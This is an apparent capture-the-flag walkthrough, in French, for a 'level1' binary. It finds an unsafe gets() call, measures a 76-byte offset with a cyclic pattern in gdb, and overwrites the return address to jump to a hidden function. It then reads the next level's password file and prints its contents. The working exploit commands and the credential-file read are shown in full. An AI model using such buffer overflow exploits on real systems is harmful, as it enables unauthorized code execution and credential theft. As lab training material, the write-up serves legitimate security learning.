Utilisons la même méthode que precedement:

```
objdump -M intel -d level1
```

On remarque l'utilisation de la fonction gets dans le main:
```
 8048489:	8d 44 24 10          	lea    eax,[esp+0x10]
 804848d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
```

Documentation sur le buffer overflow en utilisant la fonction get:
https://owasp.org/www-community/attacks/Buffer_overflow_attack

```
echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" > /tmp/test
gdb ./level1
r < /tmp/test
```

On recoit une Segfalt, notre intuition est bonne.
On recupere grace a gdb un offset: "0x63413563".
Calculons à l'aide d'un outil l'offset suivant afin d'accéder à l'adrsse mémoire de la prochaine instruction.
Il s'agit de 76.
La fonction run se trouve en 0x08048444 donc nous faisons

```python3
python -c "print('*' * 76 + '\x44\x84\x04\x08')" > /tmp/chain # inversé car endian
cat /tmp/chain - | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
